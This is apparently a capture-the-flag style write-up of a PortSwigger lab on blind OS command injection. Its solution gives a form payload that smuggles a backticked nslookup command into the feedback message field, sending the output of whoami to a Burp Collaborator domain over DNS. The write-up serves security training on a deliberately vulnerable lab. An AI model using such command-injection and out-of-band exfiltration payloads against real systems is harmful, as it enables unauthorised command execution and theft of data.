# Lab: Blind OS command injection with out-of-band data exfiltration
## Task
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

## Solution
This lab is pretty easy as we know how to create an out-of-band interaction in the [previous lab](https://github.com/datthinh1801/Writeups/blob/main/PortSwigger/OS%20Command%20Injection/Lab%2004.md).
In this lab, we just need to modify the payload so that the DNS queries contain the result of the `whoami` command.
```
name=hacker&email=hacker%40hacker.com&subject=hack&message=hack`nslookup $(whoami).gxhxpqwsvrk60lf00agakrz6hxnobd.burpcollaborator.net`
```

Poll to see new DNS queries:  

![image](https://user-images.githubusercontent.com/44528004/130432143-ec06c18f-dcaa-4621-bdab-394d8ede0027.png)
> The user is `peter-2EP5E2`.  

Submit the user on the **Home** page and ...  

![image](https://user-images.githubusercontent.com/44528004/130432298-6fe71645-525e-4b39-9998-2342a8669334.png)
> Solved!
